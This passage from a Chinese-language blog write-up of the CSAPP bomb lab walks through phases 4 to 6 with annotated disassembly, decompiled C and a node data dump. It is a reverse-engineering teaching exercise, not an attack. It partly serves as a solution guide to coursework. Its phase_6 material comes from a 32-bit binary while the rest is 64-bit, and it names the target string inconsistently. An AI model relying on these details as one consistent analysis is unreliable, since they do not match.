class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">0</span>e       cmpl   $<span class="hljs-number">0</span>xe,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)#<span class="hljs-number">0</span>xe=<span class="hljs-number">14</span> (rsp+<span class="hljs-number">8</span>)&lt;=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">401033</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">40103</span>a &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e&gt;<br>  <span class="hljs-attribute">401035</span>:e<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">40103a</span>:ba <span class="hljs-number">0</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xe,%edx#edx=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">40103f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%esi#esi=<span class="hljs-number">0</span><br>  <span class="hljs-attribute">401044</span>:<span class="hljs-number">8</span>b <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%edi#输入的第一个数字=edi,edi&lt;=<span class="hljs-number">8</span><br>  <span class="hljs-attribute">401048</span>:e<span class="hljs-number">8</span> <span class="hljs-number">81</span> ff ff ff       callq  <span class="hljs-number">400</span>fce &lt;func<span class="hljs-number">4</span>&gt;<br>  <span class="hljs-attribute">40104d</span>:<span class="hljs-number">85</span> c<span class="hljs-number">0</span>                test   %eax,%eax<br>  <span class="hljs-attribute">40104f</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401058</span> &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c&gt;<br>  <span class="hljs-attribute">401051</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,<span class="hljs-number">0</span>xc(%rsp)#第二个参数<br>  <span class="hljs-attribute">401056</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">40105</span>d &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">51</span>&gt;<br>  <span class="hljs-attribute">401058</span>:e<span class="hljs-number">8</span> dd <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">40105d</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">401061</span>:c<span class="hljs-number">3</span>                   retq   <br><br><span class="hljs-attribute">0000000000400fce</span> &lt;func<span class="hljs-number">4</span>&gt;:#edi：输入的第一个数字 esi：<span class="hljs-number">0</span><br>  <span class="hljs-attribute">400fce</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp<br>  <span class="hljs-attribute">400fd2</span>:<span class="hljs-number">89</span> d<span class="hljs-number">0</span>                mov    %edx,%eax#eax=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fd4</span>:<span class="hljs-number">29</span> f<span class="hljs-number">0</span>                sub    %esi,%eax#eax=eax-esi=<span class="hljs-number">14</span>-<span class="hljs-number">0</span>=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fd6</span>:<span class="hljs-number">89</span> c<span class="hljs-number">1</span>                mov    %eax,%ecx#ecx=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fd8</span>:c<span class="hljs-number">1</span> e<span class="hljs-number">9</span> <span class="hljs-number">1</span>f             shr    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f,%ecx#logic shift right <span class="hljs-number">31</span> bits ecx=<span class="hljs-number">0</span><br>  <span class="hljs-attribute">400fdb</span>:<span class="hljs-number">01</span> c<span class="hljs-number">8</span>                add    %ecx,%eax#eax=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fdd</span>:d<span class="hljs-number">1</span> f<span class="hljs-number">8</span>                sar    %eax #mathematical shift right <span class="hljs-number">1</span> bit,rax=<span class="hljs-number">14</span>&gt;&gt;<span class="hljs-number">1</span>=<span class="hljs-number">7</span> <br>  <span class="hljs-attribute">400fdf</span>:<span class="hljs-number">8</span>d <span class="hljs-number">0</span>c <span class="hljs-number">30</span>             lea    (%rax,%rsi,<span class="hljs-number">1</span>),%ecx #ecx=rax+rsi=<span class="hljs-number">7</span>+<span class="hljs-number">0</span>=<span class="hljs-number">7</span><br>  <span class="hljs-attribute">400fe2</span>:<span class="hljs-number">39</span> f<span class="hljs-number">9</span>                cmp    %edi,%ecx #edi&lt;=ecx<br>  <span class="hljs-attribute">400fe4</span>:<span class="hljs-number">7</span>e <span class="hljs-number">0</span>c                jle    <span class="hljs-number">400</span>ff<span class="hljs-number">2</span> &lt;func<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">24</span>&gt;<br>  <span class="hljs-attribute">400fe6</span>:<span class="hljs-number">8</span>d <span class="hljs-number">51</span> ff             lea    -<span class="hljs-number">0</span>x<span class="hljs-number">1</span>(%rcx),%edx<br>  <span class="hljs-attribute">400fe9</span>:e<span class="hljs-number">8</span> e<span class="hljs-number">0</span> ff ff ff       callq  <span class="hljs-number">400</span>fce &lt;func<span class="hljs-number">4</span>&gt;<br>  <span class="hljs-attribute">400fee</span>:<span class="hljs-number">01</span> c<span class="hljs-number">0</span>                add    %eax,%eax<br>  <span class="hljs-attribute">400ff0</span>:eb <span class="hljs-number">15</span>                jmp    <span class="hljs-number">401007</span> &lt;func<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">39</span>&gt;<br>  <span class="hljs-attribute">400ff2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400ff7</span>:<span class="hljs-number">39</span> f<span class="hljs-number">9</span>                cmp    %edi,%ecx<br>  <span class="hljs-attribute">400ff9</span>:<span class="hljs-number">7</span>d <span class="hljs-number">0</span>c                jge    <span class="hljs-number">401007</span> &lt;func<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">39</span>&gt;<br>  <span class="hljs-attribute">400ffb</span>:<span class="hljs-number">8</span>d <span class="hljs-number">71</span> <span class="hljs-number">01</span>             lea    <span class="hljs-number">0</span>x<span class="hljs-number">1</span>(%rcx),%esi<br>  <span class="hljs-attribute">400ffe</span>:e<span class="hljs-number">8</span> cb ff ff ff       callq  <span class="hljs-number">400</span>fce &lt;func<span class="hljs-number">4</span>&gt;<br>  <span class="hljs-attribute">401003</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">1</span>(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>  <span class="hljs-attribute">401007</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp<br>  <span class="hljs-attribute">40100b</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure></li></ul><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>输入一个字符串，长度为6，对于每个字符，取低四位，然后加上0x4024b0进行偏移，这样操作得到的字符串与地址为0x40245e的字符串进行比较（x/s查看可以得到是“flyer”）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000401062</span> &lt;phase_<span class="hljs-number">5</span>&gt;:#rdi保存输入的字符串<br>  <span class="hljs-attribute">401062</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-attribute">401063</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">20</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">20</span>,%rsp #<span class="hljs-number">2</span>*<span class="hljs-number">16</span>=<span class="hljs-number">32</span> bytes<br>  <span class="hljs-attribute">401067</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx #rbx保存输入的字符串<br>  <span class="hljs-attribute">40106a</span>:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> mov    %fs:<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rax #堆栈金丝雀<br>  <span class="hljs-attribute">401071</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-attribute">401073</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    %rax,<span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%rsp)#放在rsp+<span class="hljs-number">0</span>x<span class="hljs-number">18</span>位置<br>  <span class="hljs-attribute">401078</span>:<span class="hljs-number">31</span> c<span class="hljs-number">0</span>                xor    %eax,%eax #eax清零<br>  <span class="hljs-attribute">40107a</span>:e<span class="hljs-number">8</span> <span class="hljs-number">9</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40131</span>b &lt;string_length&gt;<br>  <span class="hljs-attribute">40107f</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">06</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">6</span>,%eax#这里输入的字符串的长度必须是<span class="hljs-number">6</span><br>  <span class="hljs-attribute">401082</span>:<span class="hljs-number">74</span> <span class="hljs-number">4</span>e                je     <span class="hljs-number">4010</span>d<span class="hljs-number">2</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">70</span>&gt;<br>  <span class="hljs-attribute">401084</span>:e<span class="hljs-number">8</span> b<span class="hljs-number">1</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">401089</span>:eb <span class="hljs-number">47</span>                jmp    <span class="hljs-number">4010</span>d<span class="hljs-number">2</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">70</span>&gt;<br>  <span class="hljs-attribute">40108b</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">0</span>c <span class="hljs-number">03</span>          movzbl (%rbx,%rax,<span class="hljs-number">1</span>),%ecx#ecx=rbx+rax=rbx，也即是输入的字符串的位置<br>  <span class="hljs-attribute">40108f</span>:<span class="hljs-number">88</span> <span class="hljs-number">0</span>c <span class="hljs-number">24</span>             mov    %cl,(%rsp)#cl是ecx的低<span class="hljs-number">8</span>位，也即是第一个字符<br>  <span class="hljs-attribute">401092</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">14</span> <span class="hljs-number">24</span>          mov    (%rsp),%rdx#把第一个字符赋给rdx<br>  <span class="hljs-attribute">401096</span>:<span class="hljs-number">83</span> e<span class="hljs-number">2</span> <span class="hljs-number">0</span>f             and    $<span class="hljs-number">0</span>xf,%edx#与运算 f=<span class="hljs-number">1111</span> 这里是只取低<span class="hljs-number">4</span>位<br>  <span class="hljs-comment"># 使用x/16xb 0x4024b0查看数组内的值，这里相当于把输入的字符取低四位，加上0x4024b0进行偏移得到flyers相同的字符串</span><br>  <span class="hljs-attribute">401099</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">92</span> b<span class="hljs-number">0</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> movzbl <span class="hljs-number">0</span>x<span class="hljs-number">4024</span>b<span class="hljs-number">0</span>(%rdx),%edx #edx=<span class="hljs-number">0</span>x<span class="hljs-number">73</span><br>  <span class="hljs-attribute">4010a0</span>:<span class="hljs-number">88</span> <span class="hljs-number">54</span> <span class="hljs-number">04</span> <span class="hljs-number">10</span>          mov    %dl,<span class="hljs-number">0</span>x<span class="hljs-number">10</span>(%rsp,%rax,<span class="hljs-number">1</span>)#dl=<span class="hljs-number">0</span>x<span class="hljs-number">73</span> -&gt; (rsp+rax+<span class="hljs-number">0</span>x<span class="hljs-number">10</span>)<br>  <span class="hljs-attribute">4010a4</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">0</span> <span class="hljs-number">01</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%rax # rax : <span class="hljs-number">0</span>-&gt;<span class="hljs-number">1</span><br>  <span class="hljs-attribute">4010a8</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">6</span>,%rax <br>  <span class="hljs-attribute">4010ac</span>:<span class="hljs-number">75</span> dd                jne    <span class="hljs-number">40108</span>b &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">4010ae</span>:c<span class="hljs-number">6</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>       movb   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">16</span>(%rsp)<br>  <span class="hljs-attribute">4010b3</span>:be <span class="hljs-number">5</span>e <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">40245</span>e,%esi<br>  <span class="hljs-attribute">4010b8</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">10</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">10</span>(%rsp),%rdi<br>  <span class="hljs-attribute">4010bd</span>:e<span class="hljs-number">8</span> <span class="hljs-number">76</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-attribute">4010c2</span>:<span class="hljs-number">85</span> c<span class="hljs-number">0</span>                test   %eax,%eax<br>  <span class="hljs-attribute">4010c4</span>:<span class="hljs-number">74</span> <span class="hljs-number">13</span>                je     <span class="hljs-number">4010</span>d<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">77</span>&gt;<br>  <span class="hljs-attribute">4010c6</span>:e<span class="hljs-number">8</span> <span class="hljs-number">6</span>f <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">4010cb</span>:<span class="hljs-number">0</span>f <span class="hljs-number">1</span>f <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       nopl   <span class="hljs-number">0</span>x<span class="hljs-number">0</span>(%rax,%rax,<span class="hljs-number">1</span>)<br>  <span class="hljs-attribute">4010d0</span>:eb <span class="hljs-number">07</span>                jmp    <span class="hljs-number">4010</span>d<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">77</span>&gt;<br>  <span class="hljs-attribute">4010d2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax#eax置为<span class="hljs-number">0</span><br>  <span class="hljs-attribute">4010d7</span>:eb b<span class="hljs-number">2</span>                jmp    <span class="hljs-number">40108</span>b &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">4010d9</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    <span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%rsp),%rax<br>  <span class="hljs-attribute">4010de</span>:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">33</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> xor    %fs:<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rax<br>  <span class="hljs-attribute">4010e5</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-attribute">4010e7</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4010</span>ee &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>c&gt;<br>  <span class="hljs-attribute">4010e9</span>:e<span class="hljs-number">8</span> <span class="hljs-number">42</span> fa ff ff       callq  <span class="hljs-number">400</span>b<span class="hljs-number">30</span> &lt;__stack_chk_fail@plt&gt;<br>  <span class="hljs-attribute">4010ee</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">20</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">20</span>,%rsp<br>  <span class="hljs-attribute">4010f2</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>  <span class="hljs-attribute">4010f3</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>拖进ida F5得到C语言代码，下面是我加了注释的版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">phase_6</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// edi</span><br>  _DWORD *v4; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp+0h] [ebp-58h]</span><br>  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [esp+4h] [ebp-54h]</span><br>  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+8h] [ebp-50h]</span><br>  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [esp+Ch] [ebp-4Ch]</span><br>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [esp+24h] [ebp-34h]</span><br>  <span class="hljs-keyword">int</span> v17[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+28h] [ebp-30h]</span><br>  <span class="hljs-keyword">int</span> v18[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h]</span><br><br>  read_six_numbers(s, (<span class="hljs-keyword">int</span>)v18);<span class="hljs-comment">//读入六个数字</span><br>  v1 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v18[v1] - <span class="hljs-number">1</span>) &gt; <span class="hljs-number">5</span> ) <span class="hljs-comment">//这六个数字必须都是小于等于6</span><br>      explode_bomb(v12, v13, v14, v15);<br>    <span class="hljs-keyword">for</span> ( i = v1 + <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v18[v1] == v18[i] )<span class="hljs-comment">//两两不相等，也即是1~6各出现一个</span><br>        explode_bomb(v12, v13, v14, v15);<br>    &#125;<br>    ++v1;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v1 &lt;= <span class="hljs-number">5</span> );<br>  <span class="hljs-comment">// 六个数字都是小于等于6且互不相等</span><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v4 = &amp;node1;<span class="hljs-comment">//v4是一个node1结构体的地址</span><br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">1</span>; j &lt; v18[v3]; ++j )<br>      v4 = (_DWORD *)v4[<span class="hljs-number">2</span>];<span class="hljs-comment">//v4[2]存储的是指向下一个结构体的指针</span><br>    v17[v3++] = (<span class="hljs-keyword">int</span>)v4;<span class="hljs-comment">//v17存储排序后的结构体链表的地址</span><br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 &lt;= <span class="hljs-number">5</span> );<br><br>  v6 = v17[<span class="hljs-number">0</span>];<br>  v16 = v17[<span class="hljs-number">0</span>];<br>  v7 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v8 = v17[v7];<br>    *(_DWORD *)(v6 + <span class="hljs-number">8</span>) = v8;<span class="hljs-comment">// +0  +4  +8分别对应：储存的值     序号     下一个结构体的地址，这里是把排序后的结构体链接起来</span><br>    v6 = v8;<br>    ++v7;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v7 &lt;= <span class="hljs-number">5</span> );<br><br>  *(_DWORD *)(v8 + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;<span class="hljs-comment">//最后一个节点，指向的地址是0</span><br>  v9 = v16;<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    result = *(_DWORD *)v9;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)v9 &lt; **(_DWORD **)(v9 + <span class="hljs-number">8</span>) )<span class="hljs-comment">//排序后的结构体链表需要满足：存储的值是从大到小排序</span><br>      explode_bomb(v12, v13, v14, v15);<br>    v9 = *(_DWORD *)(v9 + <span class="hljs-number">8</span>);<br>    ++v10;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v10 &lt;= <span class="hljs-number">4</span> );<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>观察node结构体的特点，发现node[0]表示存储的值，node[1]表示node编号，node[2] 存储下一个node的地址</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.data:<span class="hljs-number">0804B254</span> node3           db  2Dh ; -<br>.data:<span class="hljs-number">0804B255</span>                 db    <span class="hljs-number">1</span><br>.data:<span class="hljs-number">0804B256</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B257</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B258</span>                 db    <span class="hljs-number">3</span><br>.data:<span class="hljs-number">0804B259</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B25A</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B25B</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B25C</span>                 db  48h ; H<br>.data:<span class="hljs-number">0804B25D</span>                 db <span class="hljs-number">0B2h</span><br>.data:<span class="hljs-number">0804B25E</span>                 db    <span class="hljs-number">4</span><br>.data:<span class="hljs-number">0804B25F</span>                 db    <span class="hljs-number">8</span><br>.data:<span class="hljs-number">0804B260</span>                 public node2<br>.data:<span class="hljs-number">0804B260</span> node2           db <span class="hljs-number">0D5h</span><br>.data:<span class="hljs-number">0804B261</span>                 db    <span class="hljs-number">2</span><br>.data:<span class="hljs-number">0804B262</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B263</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B264</span>                 db    <span class="hljs-number">2</span><br>.data:<span class="hljs-number">0804B265</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B266</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B267</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B268</span>                 db  54h ; T<br>.data:<span class="hljs-number">0804B269</span>                 db <span class="hljs-number">0B2h</span><br>.data:<span class="hljs-number">0804B26A</span>                 db    <span class="hljs-number">4</span><br>.data:<span class="hljs-number">0804B26B</span>                 db    <span 